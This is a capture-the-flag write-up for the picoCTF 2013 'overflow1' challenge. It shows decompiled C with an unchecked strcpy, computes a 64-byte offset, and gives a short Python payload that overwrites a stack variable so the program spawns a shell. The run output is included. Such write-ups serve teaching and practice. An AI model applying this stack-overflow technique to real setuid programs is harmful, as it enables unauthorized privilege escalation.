### S0lv3d by H4yicl3

First i download source here:https://2013.picoctf.com/problems/overflow1-3948d17028101c40

then i use IDA to analysis the code
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v4; // ST1C_4@3

  if ( argc == 2 )
  {
    v4 = geteuid();
    setresuid(v4, v4, v4);	<-----setresuid() function
    vuln(0, (char *)argv[1]);<----- vuln here
  }
  puts("Usage: stack_overwrite [str]");
  return 1;
}
```

the vuln function
```c
void __cdecl __noreturn vuln(int a1, char *src)
{
  char dest; // [sp+1Ch] [bp-4Ch]@1			//<---------- this is buffer
  int v3; // [sp+5Ch] [bp-Ch]@1 			//<----------v3 	

  v3 = a1;
  strcpy(&dest, src);
  dump_stack((int)&dest, 23, (int)&a1);
  printf("win = %d\n", v3);
  if ( v3 == 1 )							//<-----------if v3 =1
    execl("/bin/sh", "sh", 0);				//we have the shell
  else
    puts("Sorry, you lose.");
  exit(0);
}
```
So we need to overwrite the v3 = 1
```
|			|
|			|
|			|
|	v3		|-0000000C v3           dd ?
|		+	|
|		|	|
|		|	|
|	dest|	|-0000004C dest            db ?
```

offset = 0x4c(dest)-0xc(v3) = 0x40=64

the python script to change v3 become 1 look like
```python
padding ="A"*64
padding +="\x01"
print padding
```

try run it

```
./overflow1 $(python overflow1.py)
Stack dump:
0xfffb59a4: 0xfffb686a (second argument)
0xfffb59a0: 0x00000000 (first argument)
0xfffb599c: 0x0804870f (saved eip)
0xfffb5998: 0xfffb59c8 (saved ebp)
0xfffb5994: 0xf76ec000
0xfffb5990: 0xf75f7e07
0xfffb598c: 0x00000001
0xfffb5988: 0x41414141
0xfffb5984: 0x41414141
0xfffb5980: 0x41414141
0xfffb597c: 0x41414141
0xfffb5978: 0x41414141
0xfffb5974: 0x41414141
0xfffb5970: 0x41414141
0xfffb596c: 0x41414141
0xfffb5968: 0x41414141
0xfffb5964: 0x41414141
0xfffb5960: 0x41414141
0xfffb595c: 0x41414141
0xfffb5958: 0x41414141
0xfffb5954: 0x41414141
0xfffb5950: 0x41414141
0xfffb594c: 0x41414141 (beginning of buffer)
win = 1
$ whoami
hayicle
$ 
```
GLHF